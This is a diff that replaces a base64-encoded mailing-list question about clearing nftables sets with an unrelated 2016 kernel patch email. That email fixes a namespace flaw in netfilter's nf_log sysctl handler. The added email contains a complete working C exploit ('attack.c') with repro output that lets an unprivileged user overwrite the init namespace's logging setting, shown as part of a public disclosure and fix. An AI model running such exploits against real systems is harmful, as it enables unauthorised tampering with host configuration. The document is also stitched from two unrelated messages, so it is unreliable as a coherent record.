@@ -1,74 +1,144 @@
-From: "Anders K. Pedersen | Cohaesio" <akp@cohaesio.com>
-Subject: [nft] Problems with flushing all elements from a set
-Date: Sun, 18 Sep 2016 13:19:24 +0000
-Message-ID: <1474204764.1527.46.camel@cohaesio.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
-To: "netfilter-devel@vger.kernel.org" <netfilter-devel@vger.kernel.org>
-Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from bender.cohaesio.com ([212.97.128.130]:53437 "EHLO
-        mail.cohaesio.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1755764AbcIRNT3 (ORCPT
-        <rfc822;netfilter-devel@vger.kernel.org>);
-        Sun, 18 Sep 2016 09:19:29 -0400
-Received: from localhost (localhost.localdomain [127.0.0.1])
-        by mail.cohaesio.com (Postfix) with ESMTP id 5C4C178812E1
-        for <netfilter-devel@vger.kernel.org>; Sun, 18 Sep 2016 15:19:25 +0200 (CEST)
-Received: from mail.cohaesio.com ([127.0.0.1])
-        by localhost (bender.cohaesio.com [127.0.0.1]) (amavisd-new, port 10028)
-        with LMTP id hjKn-jvAmHWN for <netfilter-devel@vger.kernel.org>;
-        Sun, 18 Sep 2016 15:19:25 +0200 (CEST)
-Received: from cohexch01.cohaesio.com (cohexch01.cohaesio.com [212.97.128.231])
-        by mail.cohaesio.com (Postfix) with ESMTP id 3F0597801123
-        for <netfilter-devel@vger.kernel.org>; Sun, 18 Sep 2016 15:19:25 +0200 (CEST)
-Content-Language: en-US
-Content-ID: <177D0835E676A94281443CC13BCAA902@surftown.com>
-Sender: netfilter-devel-owner@vger.kernel.org
-List-ID: <netfilter-devel.vger.kernel.org>
+From: Jann Horn <jann@thejh.net>
+Subject: [PATCH] netfilter: fix namespace handling in nf_log_proc_dostring
+Date: Sun, 18 Sep 2016 21:40:55 +0200
+Message-ID: <1474227655-5022-1-git-send-email-jann@thejh.net>
+Cc: netfilter-devel@vger.kernel.org, netdev@vger.kernel.org,
+        security@kernel.org
+To: Pablo Neira Ayuso <pablo@netfilter.org>,
+        Patrick McHardy <kaber@trash.net>,
+        Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>,
+        "David S. Miller" <davem@davemloft.net>
+Return-path: <netdev-owner@vger.kernel.org>
+Sender: netdev-owner@vger.kernel.org
+List-Id: netfilter-devel.vger.kernel.org
 
-SGVsbG8sDQoNCkknbSB0cnlpbmcgdG8gdXNlIG5mdGFibGVzIHRvIGZpbHRlciB0cmFmZmljIGZy
-b20ga25vd24gYm9nb24gYWRkcmVzc2VzDQpiYXNlZCBvbiB0aGUgbGlzdCBhdmFpbGFibGUgYXQN
-Cmh0dHA6Ly93d3cudGVhbS1jeW1ydS5vcmcvU2VydmljZXMvQm9nb25zL2Z1bGxib2dvbnMtaXB2
-NC50eHTCoC4NCg0KTG9hZGluZyB0aGlzIGxpc3QgaW5pdGlhbGx5IHdvcmtzIGZpbmUsIGJ1dCBJ
-IGFsc28gd2FudCB0byB1cGRhdGUgaXQNCnJlZ3VsYXJseSAocHJlZmVyYWJseSB3aXRob3V0IGZs
-dXNoaW5nIHRoZSBlbnRpcmUgbmZ0YWJsZXMgcnVsZSBzZXQsDQp3aGljaCB3b3VsZCBjbGVhciBh
-bGwgdHJhZmZpYyBjb3VudGVycyBldGMuKS4gU2luY2UgdGhlcmUgaXMgbm8gZmx1c2gNCm9wZXJh
-dGlvbiBmb3Igc2V0cywgSSBkZWNpZGVkIHRvIGRlbGV0ZSBhbGwgdGhlIG1lbWJlcnMgb2YgdGhl
-IHNldCwgYnV0DQp0aGlzIGRvZXNuJ3Qgd29yayBhcyBleHBlY3RlZC4NCg0KSSB1c2UgdGhlIGZv
-bGxvd2luZyBzaGVsbCBjb2RlIGNvbnZlcnQgdGhlIGlucHV0IGZpbGUgdG8gbmZ0YWJsZXMNCnN5
-bnRheDoNCg0KZWNobyAiYWRkIHNldCBpcCBmaWx0ZXIgYm9nb25zIHsgdHlwZSBpcHY0X2FkZHI7
-IGZsYWdzIGludGVydmFsOyB9IiA+bmZ0LnJ1bGVzDQplY2hvIC1uICJhZGQgZWxlbWVudCBpcCBm
-aWx0ZXIgYm9nb25zIHsgIiA+Pm5mdC5ydWxlcw0KST0wDQplZ3JlcCAtdiAnXigjfCQpJyBmdWxs
-Ym9nb25zLWlwdjQudHh0IHwNCgl3aGlsZSByZWFkIENJRFIgOyBkbw0KCQlpZiBbWyAke0l9ID0g
-MCBdXTsgdGhlbg0KCQkJZWNobyAtbiAiJHtDSURSfSINCgkJZWxzZQ0KCQkJZWNobyAtbiAiLCAk
-e0NJRFJ9Ig0KICAgICAgICAgICAgICAgIGZpDQoJCUk9MQ0KIAlkb25lID4+bmZ0LnJ1bGVzDQpl
-Y2hvICIgfSIgPj5uZnQucnVsZXMNCg0KTG9hZGluZyBpdCBpbml0aWFsbHkgd2l0aCAnbmZ0IC1m
-IG5mdC5ydWxlcycgd29ya3MgZmluZS4gSSB0aGVuIHVzZSB0aGUNCmZvbGxvd2luZyBzaGVsbCBj
-b2RlIHRvIHRyeSB0byBjbGVhciBpdCBhZ2FpbjoNCg0KbmZ0IGxpc3Qgc2V0IGlwIGZpbHRlciBi
-b2dvbnMgfA0KCWVncmVwICJeW1s6c3BhY2U6XV0rZWxlbWVudHMgPSIgfA0KCXNlZCAtZSAicy8u
-KnsvZGVsZXRlIGVsZW1lbnQgaXAgZmlsdGVyIGJvZ29ucyB7LyIgPm5mdC5yZW1vdmUNCm5mdCAt
-ZiBuZnQucmVtb3ZlDQoNCldoZW4gSSBydW4gdGhpcyBmb3IgdGhlIGZpcnN0IHRpbWUsIG5mdCBk
-b2Vzbid0IGdpdmUgYW55IG91dHB1dCwgd2hpY2gNCnN1Z2dlc3RzIHRoYXQgaXQgc3VjY2VlZGVk
-LCBidXQgb25seSB+NDAlIG9mIHRoZSBlbGVtZW50cyB3ZXJlIGFjdHVhbGx5DQpyZW1vdmVkLiBX
-aGVuIEkgcnVuIHRoZSByZW1vdmFsIGNvZGUgYWdhaW4sIEkgZ2V0IG5vIG91dHB1dCBhbmQgbm8N
-CmZ1cnRoZXIgZWxlbWVudHMgd2VyZSByZW1vdmVkLg0KDQpJIG5vdGljZWQgdGhhdCB0aGUgbmZ0
-IGV4aXQgY29kZSB3YXMgMSBhbmQgd2l0aCBzdHJhY2UgSSBmb3VuZCB0aGF0IHRoZQ0KbmV0bGlu
-ayBzb2NrZXQgZ290IGEgcmVwbHkgd2l0aMKgbXNnX2ZsYWdzPU1TR19UUlVOQyBqdXN0IGJlZm9y
-ZQ0KZXhpdGluZy4gQnkgYWRkaW5nIGRlYnVnIG91dHB1dCB0byBlcnJvciBwYXRocywgSSB0cmFj
-ZWQgdGhpcyBiYWNrIHRvDQp0aGXCoG1ubF9jYl9ydW4oKSBjYWxsIGluwqBtbmxfYmF0Y2hfdGFs
-aygpLiBCeSBpbmNyZWFzaW5nIHRoZSBzaXplDQpvZsKgcmN2X2J1ZiB0b8KgMzIqTU5MX1NPQ0tF
-VF9CVUZGRVJfU0laRSAobGVzcyBtYXkgaGF2ZSBiZWVuIGVub3VnaCwgYnV0DQoyKiB3YXNuJ3Qp
-IEkgZ290IHBhc3QgdGhhdCBlcnJvciwgYW5kIG5mdCBnYXZlIHRoZSBmb2xsb3dpbmcgZXJyb3IN
-Cm1lc3NhZ2U6DQoNCm5mdC5yZW1vdmU6MToxLTMzMzQ4OiBFcnJvcjogQ291bGQgbm90IHByb2Nl
-c3MgcnVsZTogTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeQ0KDQpJIGJlbGlldmUgaXQgaXMgdHJ5
-aW5nIHRvIHRlbGwgbWUgdGhhdCB0aGUgZWxlbWVudHMsIEknbSB0cnlpbmcgdG8NCnJlbW92ZSwg
-YXJlIG5vdCBwcmVzZW50IGluIHRoZSBzZXQsIGJ1dCAibmZ0IGxpc3Qgc2V0IGlwIGZpbHRlciBi
-b2dvbnMiDQp0ZWxscyBtZSB0aGF0IHRoZXkgYXJlLg0KDQpJJ3ZlIHRyaWVkIHRvIGZpZ3VyZSBv
-dXQgd2hhdCdzIGNhdXNpbmcgdGhpcyBwcm9ibGVtLCBidXQgbXkNCnVuZGVyc3RhbmRpbmcgb2Yg
-dGhlIG5ldGxpbmsgY29kZSBpc24ndCBzdWZmaWNpZW50IHRvIG1ha2UgcHJvZ3Jlc3MsIHNvDQph
-bnkgaGVscCB3b3VsZCBiZSBtdWNoIGFwcHJlY2lhdGVkLg0KDQpNeSBlbnZpcm9ubWVudCBoYXMg
-TGludXggNC43LjQgcGx1cyB0aGUgcGF0Y2ggZnJvbQ0KaHR0cDovL3d3dy5zcGluaWNzLm5ldC9s
-aXN0cy9uZXRkZXYvbXNnMzg5NDkwLmh0bWzCoCwgbGlibW5sLTEuMC40LCBhbmQNCmN1cnJlbnQg
-Z2l0IHZlcnNpb25zIG9mIGxpYm5mdG5sIGFuZMKgbmZ0YWJsZXMuDQoNClJlZ2FyZHMsDQpBbmRl
-cnMgSy4gUGVkZXJzZW4=
+nf_log_proc_dostring() used current's network namespace instead of the one
+corresponding to the sysctl file the write was performed on. Because the
+permission check happens at open time and the nf_log files in namespaces
+are accessible for the namespace owner, this can be abused by an
+unprivileged user to effectively write to the init namespace's nf_log
+sysctls.
+
+Stash the "struct net *" in extra2 - data and extra1 are already used.
+
+Repro code:
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <sched.h>
+#include <err.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+
+char child_stack[1000000];
+
+uid_t outer_uid;
+gid_t outer_gid;
+int stolen_fd = -1;
+
+void writefile(char *path, char *buf) {
+        int fd = open(path, O_WRONLY);
+        if (fd == -1)
+                err(1, "unable to open thing");
+        if (write(fd, buf, strlen(buf)) != strlen(buf))
+                err(1, "unable to write thing");
+        close(fd);
+}
+
+int child_fn(void *p_) {
+        if (mount("proc", "/proc", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC,
+                  NULL))
+                err(1, "mount");
+
+        /* Yes, we need to set the maps for the net sysctls to recognize us
+         * as namespace root.
+         */
+        char buf[1000];
+        sprintf(buf, "0 %d 1\n", (int)outer_uid);
+        writefile("/proc/1/uid_map", buf);
+        writefile("/proc/1/setgroups", "deny");
+        sprintf(buf, "0 %d 1\n", (int)outer_gid);
+        writefile("/proc/1/gid_map", buf);
+
+        stolen_fd = open("/proc/sys/net/netfilter/nf_log/2", O_WRONLY);
+        if (stolen_fd == -1)
+                err(1, "open nf_log");
+        return 0;
+}
+
+int main(void) {
+        outer_uid = getuid();
+        outer_gid = getgid();
+
+        int child = clone(child_fn, child_stack + sizeof(child_stack),
+                          CLONE_FILES|CLONE_NEWNET|CLONE_NEWNS|CLONE_NEWPID
+                          |CLONE_NEWUSER|CLONE_VM|SIGCHLD, NULL);
+        if (child == -1)
+                err(1, "clone");
+        int status;
+        if (wait(&status) != child)
+                err(1, "wait");
+        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+                errx(1, "child exit status bad");
+
+        char *data = "NONE";
+        if (write(stolen_fd, data, strlen(data)) != strlen(data))
+                err(1, "write");
+        return 0;
+}
+
+Repro:
+
+$ gcc -Wall -o attack attack.c -std=gnu99
+$ cat /proc/sys/net/netfilter/nf_log/2
+nf_log_ipv4
+$ ./attack
+$ cat /proc/sys/net/netfilter/nf_log/2
+NONE
+
+Because this looks like an issue with very low severity, I'm sending it to
+the public list directly.
+
+Signed-off-by: Jann Horn <jann@thejh.net>
+---
+ net/netfilter/nf_log.c | 6 ++++--
+ 1 file changed, 4 insertions(+), 2 deletions(-)
+
+diff --git a/net/netfilter/nf_log.c b/net/netfilter/nf_log.c
+index aa5847a..1df2c8d 100644
+--- a/net/netfilter/nf_log.c
++++ b/net/netfilter/nf_log.c
+@@ -420,7 +420,7 @@ static int nf_log_proc_dostring(struct ctl_table *table, int write,
+ 	char buf[NFLOGGER_NAME_LEN];
+ 	int r = 0;
+ 	int tindex = (unsigned long)table->extra1;
+-	struct net *net = current->nsproxy->net_ns;
++	struct net *net = table->extra2;
+ 
+ 	if (write) {
+ 		struct ctl_table tmp = *table;
+@@ -474,7 +474,6 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 				 3, "%d", i);
+ 			nf_log_sysctl_table[i].procname	=
+ 				nf_log_sysctl_fnames[i];
+-			nf_log_sysctl_table[i].data = NULL;
+ 			nf_log_sysctl_table[i].maxlen = NFLOGGER_NAME_LEN;
+ 			nf_log_sysctl_table[i].mode = 0644;
+ 			nf_log_sysctl_table[i].proc_handler =
+@@ -484,6 +483,9 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 		}
+ 	}
+ 
++	for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++)
++		table[i].extra2 = net;
++
+ 	net->nf.nf_log_dir_header = register_net_sysctl(net,
+ 						"net/netfilter/nf_log",
+ 						table);
+-- 
+2.1.4
